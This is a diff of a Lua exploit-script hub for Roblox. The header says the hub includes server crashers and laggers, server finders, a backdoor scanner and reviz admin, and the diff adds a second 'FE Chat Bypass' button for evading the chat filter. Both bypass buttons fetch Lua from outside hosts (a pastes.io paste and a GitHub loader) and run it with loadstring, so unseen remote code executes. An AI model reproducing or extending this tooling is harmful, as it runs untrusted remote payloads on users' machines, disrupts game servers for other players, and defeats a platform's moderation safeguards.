@@ -1,6 +1,6 @@
 --[[
 Last Updated on 2/25/2024 
-added server searchers/finders and server crashers/laggers and reviz admin
+added server searchers/finders and server crashers/laggers and reviz admin and another bypass
 ]]--
 local OptTheme = "Midnight"
 local string = "https://discord.gg/xwy5Cu62Vw"
@@ -354,6 +354,10 @@ end)
 
 MainSection:NewButton("FE Chat Bypass", "bypasses chat filter can cuss", function()
 	loadstring(game:HttpGet('https://pastes.io/raw/lstrrfipqq'))();
+ end)
+
+ MainSection:NewButton("FE Chat Bypass 2", "bypasses chat filter can cuss", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua",true))()
  end)
 
 MainSection:NewButton("BackDoor.exe", "scan for backdoors", function()
